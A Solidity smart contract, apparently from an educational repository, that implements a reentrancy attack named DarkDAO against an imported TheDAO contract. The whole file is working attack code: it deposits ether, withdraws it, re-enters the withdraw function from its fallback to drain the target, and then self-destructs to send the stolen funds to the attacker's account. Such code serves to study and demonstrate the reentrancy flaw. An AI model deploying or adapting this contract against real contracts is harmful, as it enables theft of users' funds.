// SPDX-License-Identifier: MIT
// https://github.com/maAPPsDEV/reentrancy-attack

pragma solidity 0.7.0;

import "./TheDAO.sol";

contract DarkDAO {
  address payable public hacker;

  TheDAO targetContract;

  event Start(address indexed _target, uint256 _balance);
  event Stop(address indexed _target, uint256 _balance);
  event Reenter(address indexed _target, uint256 _balance);

  modifier onlyHacker {
    require(msg.sender == hacker, "caller is not the hacker");
    _;
  }

  constructor() public {
    hacker = payable(msg.sender);
  }

  function attack(address _target) public payable onlyHacker {
    require(msg.value >= (0.1 ether), "Not enough ether to attack");
    targetContract = TheDAO(payable(_target));

    // 0. Donate with the address of hacker contract
    targetContract.donate{value: (0.1 ether)}(address(this));

    // 1. Withdraw the ether back to hacker contract
    emit Start(_target, address(this).balance);
    targetContract.withdraw(0.1 ether);
  }

  fallback() external payable {
    /// @dev in practice no need to check the target's balance.
    /// `call` will just returns false on insufficient ether,
    /// and the chain of transactions will be completed successfully
    // 2. Check target balance, if no more ether, stop attack
    // if (address(targetContract).balance < (0.1 ether)) {
    //   emit Stop(address(targetContract), address(this).balance);
    //   return;
    // }

    // 3. Re-entrancy Attack
    emit Reenter(address(targetContract), address(this).balance);
    targetContract.withdraw(0.1 ether);
  }

  function kill() external onlyHacker {
    // 4. Get the stolens back to hacker account, and disappear
    selfdestruct(hacker);
  }
}
